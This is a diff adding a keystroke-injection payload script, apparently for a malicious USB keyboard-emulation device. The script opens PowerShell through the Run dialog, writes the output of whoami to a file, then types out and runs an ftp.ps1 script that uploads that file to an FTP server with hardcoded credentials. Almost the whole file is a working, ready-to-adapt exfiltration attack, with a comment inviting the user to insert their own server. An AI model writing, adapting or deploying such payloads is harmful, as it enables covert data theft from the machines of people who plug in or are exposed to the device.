@@ -1,0 +1,27 @@
+Rem:Based on example from https://stackoverflow.com/a/2485696/537243
+Rem:Due to formatting the exfiltrated data may not show up properly when viewing it in "List Exfiltrated Data"
+Rem:To get around this issue simply click on "Download File" when on the "List Exfiltrated Data" page
+DefaultDelay:2000
+Press:131+114
+PrintLine:powershell
+CustomDelay:3000
+PrintLine:whoami | Out-File data
+PrintLine:notepad ftp.ps1
+CustomDelay:1000
+Press:176
+CustomDelay:1000
+Rem:Modify the line below with your settings
+PrintLine:
+PrintLine:$ftpURI = "ftp://ftp-admin:hacktheplanet@192.168.1.1/data"
+PrintLine:$webclient = New-Object -TypeName System.Net.WebClient;
+PrintLine:$ftpURI = New-Object -TypeName System.Uri -ArgumentList $ftpURI;
+PrintLine:$webclient.UploadFile($ftpURI, [System.ENVIRONMENT]::CurrentDirectory + "\data");
+PrintLine:Write-output  "Uploaded file ... ";
+Press:130+197
+CustomDelay:1000
+PrintLine:s
+Press:176
+CustomDelay:1000
+PrintLine:
+CustomDelay:5000
+PrintLine:.\ftp.ps1
